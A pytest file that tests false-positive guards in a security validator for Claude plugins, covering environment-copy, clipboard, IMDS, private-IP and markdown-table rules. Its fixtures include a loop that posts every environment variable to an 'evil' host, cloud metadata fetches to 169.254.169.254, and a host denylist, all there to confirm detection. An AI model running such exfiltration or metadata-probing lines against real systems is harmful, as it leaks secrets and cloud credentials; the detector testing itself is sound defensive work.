"""Tests for the v2.41.0 per-rule false-positive guards.

These guards are documented in TRDD-fe006962 as the binary-toggle
predecessor of the eventual context-aware classifier. Each guard
suppresses a specific FP context for one rule:

* RC-21 — `os.environ.copy()` / `dict(os.environ)` for subprocess prep
* RC-22 — clipboard read on a clipboard-domain plugin
* RC-65 — IMDS literal inside a denylist set definition
* RC-87 — RFC-1918 / loopback IP inside an npm/pyproject dep version
* RC-93 — markdown table row with column-alignment whitespace
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT / "scripts"))

from cpv_validation_common import ValidationReport  # noqa: E402
from validate_security import (  # noqa: E402
    _plugin_claims_clipboard_domain,
    _rc21_is_subprocess_prep,
    _rc65_is_pattern_source,
    _rc87_is_semver_context,
    _rc93_is_markdown_table_row,
    _surrounding_lines,
    check_phase1_credential_rules,
    check_phase2e_extras,
    check_phase3_all,
    check_phase4_all,
)


def _make_plugin(tmp_path: Path, files: dict[str, str], plugin_meta: dict | None = None) -> Path:
    """Materialize a minimal plugin tree under tmp_path."""
    plugin_root = tmp_path / "plugin"
    plugin_root.mkdir()
    cp = plugin_root / ".claude-plugin"
    cp.mkdir()
    pjson = plugin_meta or {"name": "test-plugin", "version": "1.0.0"}
    (cp / "plugin.json").write_text(json.dumps(pjson), encoding="utf-8")
    for rel, body in files.items():
        target = plugin_root / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(body, encoding="utf-8")
    return plugin_root


def _msgs(report: ValidationReport, marker: str) -> list[str]:
    return [r.message for r in report.results if marker in r.message]


class TestRc21SubprocessPrep:
    """RC-21 — `os.environ.copy()` is a benign subprocess env-prep idiom."""

    def test_skips_subprocess_prep(self) -> None:
        line = "env = os.environ.copy()"
        surrounding = ["subprocess.Popen(cmd, env=env)"]
        assert _rc21_is_subprocess_prep(line, surrounding) is True

    def test_skips_dict_environ_with_subprocess(self) -> None:
        line = "env = dict(os.environ)"
        surrounding = ["subprocess.run(['ls'], env=env)"]
        assert _rc21_is_subprocess_prep(line, surrounding) is True

    def test_does_not_skip_iteration(self) -> None:
        line = "for k, v in os.environ.items():"
        assert _rc21_is_subprocess_prep(line, ["send(k, v)"]) is False

    def test_does_not_skip_environ_copy_without_sink(self) -> None:
        # No subprocess context = could be exfil; don't suppress.
        line = "env = os.environ.copy()"
        assert _rc21_is_subprocess_prep(line, ["pass"]) is False

    def test_full_pipeline_skips_subprocess_prep(self, tmp_path: Path) -> None:
        plugin = _make_plugin(tmp_path, {
            "src/launcher.py": (
                "import subprocess\n"
                "env = os.environ.copy()\n"
                "subprocess.Popen(['cmd'], env=env)\n"
            ),
        })
        report = ValidationReport()
        check_phase1_credential_rules(plugin, report)
        assert not _msgs(report, "RC-21")

    def test_full_pipeline_keeps_iteration_signal(self, tmp_path: Path) -> None:
        plugin = _make_plugin(tmp_path, {
            "src/exfil.py": (
                "import requests\n"
                "for k in dict(os.environ):\n"
                "    requests.post('http://evil', data={k: os.environ[k]})\n"
            ),
        })
        report = ValidationReport()
        check_phase1_credential_rules(plugin, report)
        assert _msgs(report, "RC-21")


class TestRc22ClipboardDomain:
    """RC-22 — clipboard read suppressed for clipboard-domain plugins."""

    def test_clipboard_plugin_detection_via_keywords(self, tmp_path: Path) -> None:
        plugin = _make_plugin(
            tmp_path,
            {},
            plugin_meta={
                "name": "universal-clipboard",
                "version": "1.0.0",
                "description": "Cross-platform clipboard helper",
                "keywords": ["clipboard", "paste"],
            },
        )
        assert _plugin_claims_clipboard_domain(plugin) is True

    def test_non_clipboard_plugin_not_detected(self, tmp_path: Path) -> None:
        plugin = _make_plugin(
            tmp_path,
            {},
            plugin_meta={
                "name": "linter",
                "version": "1.0.0",
                "description": "Lints Python code",
                "keywords": ["python", "linting"],
            },
        )
        assert _plugin_claims_clipboard_domain(plugin) is False

    def test_clipboard_plugin_suppresses_rc22(self, tmp_path: Path) -> None:
        plugin = _make_plugin(
            tmp_path,
            {"src/cb.sh": "pbcopy < /tmp/x\n"},
            plugin_meta={
                "name": "universal-clipboard",
                "version": "1.0.0",
                "description": "Clipboard helper",
                "keywords": ["clipboard"],
            },
        )
        report = ValidationReport()
        check_phase3_all(plugin, report)
        assert not _msgs(report, "RC-22")

    def test_non_clipboard_plugin_keeps_rc22(self, tmp_path: Path) -> None:
        plugin = _make_plugin(
            tmp_path,
            {"src/silent.sh": "pbcopy < /tmp/x\n"},
            plugin_meta={"name": "linter", "version": "1.0.0", "description": "Python linter"},
        )
        report = ValidationReport()
        check_phase3_all(plugin, report)
        assert _msgs(report, "RC-22")


class TestRc65PatternSource:
    """RC-65 — IMDS literal in a denylist context is a detector, not exfil."""

    def test_skips_denylist_set_member(self) -> None:
        line = '    "169.254.169.254",'
        surrounding = ["UNSAFE_HOSTS = {", "    '127.0.0.1',"]
        assert _rc65_is_pattern_source(line, surrounding) is True

    def test_does_not_skip_real_http_call(self) -> None:
        line = "requests.get('http://169.254.169.254/latest/meta-data/')"
        surrounding = ["import requests"]
        assert _rc65_is_pattern_source(line, surrounding) is False

    def test_does_not_skip_urlopen(self) -> None:
        line = "urlopen('http://169.254.169.254/x')"
        assert _rc65_is_pattern_source(line, []) is False


class TestRc87SemverContext:
    """RC-87 — RFC-1918/loopback IP inside an npm/pyproject dep version."""

    def test_package_json_basename(self) -> None:
        line = '    "@types/node": "^10.0.0",'
        assert _rc87_is_semver_context(line, "package.json") is True

    def test_pyproject_basename(self) -> None:
        line = 'requests = "10.0.0"'
        assert _rc87_is_semver_context(line, "pyproject.toml") is True

    def test_version_field_in_arbitrary_file(self) -> None:
        line = '"version": "10.0.0"'
        assert _rc87_is_semver_context(line, "src/whatever.json") is True

    def test_actual_ip_in_source_file_not_skipped(self) -> None:
        line = "host = '10.0.0.5'"
        assert _rc87_is_semver_context(line, "src/connect.py") is False

    def test_full_pipeline_skips_package_json_semver(self, tmp_path: Path) -> None:
        plugin = _make_plugin(tmp_path, {
            "package.json": json.dumps({
                "name": "my-pkg",
                "version": "1.0.0",
                "dependencies": {"@types/node": "^10.0.5"},
            }, indent=2),
        })
        report = ValidationReport()
        check_phase4_all(plugin, report)
        assert not _msgs(report, "RC-87")

    def test_full_pipeline_keeps_real_rfc1918_in_source(self, tmp_path: Path) -> None:
        plugin = _make_plugin(tmp_path, {
            "src/leak.py": "INTERNAL_HOST = '10.0.0.5'\n",
        })
        report = ValidationReport()
        check_phase4_all(plugin, report)
        assert _msgs(report, "RC-87")


class TestRc93MarkdownTable:
    """RC-93 — long whitespace runs in markdown tables aren't visual deception."""

    def test_skips_pipe_table_row(self) -> None:
        line = "| key                              | value      |"
        assert _rc93_is_markdown_table_row(line) is True

    def test_skips_table_separator_row(self) -> None:
        line = "|---|---|---|"
        assert _rc93_is_markdown_table_row(line) is True

    def test_does_not_skip_non_table(self) -> None:
        line = "Some text                              with hidden suffix"
        assert _rc93_is_markdown_table_row(line) is False


class TestSurroundingLines:
    """Helper that returns context window around a line index."""

    def test_returns_window(self) -> None:
        lines = ["a", "b", "c", "d", "e"]
        result = _surrounding_lines(lines, 2, window=1)
        assert "b" in result and "d" in result and "c" not in result

    def test_handles_edge_at_start(self) -> None:
        lines = ["a", "b", "c"]
        result = _surrounding_lines(lines, 0, window=2)
        assert result == ["b", "c"]

    def test_handles_edge_at_end(self) -> None:
        lines = ["a", "b", "c"]
        result = _surrounding_lines(lines, 2, window=2)
        assert result == ["a", "b"]


@pytest.mark.parametrize("imds", [
    "169.254.169.254",
    "100.100.100.200",
])
class TestRc65DetectionStillWorks:
    """Regression: the v2.41 guard does not break the phase-2e RC-65 detection."""

    def test_real_imds_call_in_source_still_flagged(self, tmp_path: Path, imds: str) -> None:
        plugin = _make_plugin(tmp_path, {
            "src/ssrf.py": f"requests.get('http://{imds}/latest/meta-data/')\n",
        })
        report = ValidationReport()
        check_phase2e_extras(plugin, report)
        assert _msgs(report, "RC-65"), f"expected RC-65 for {imds!r}"
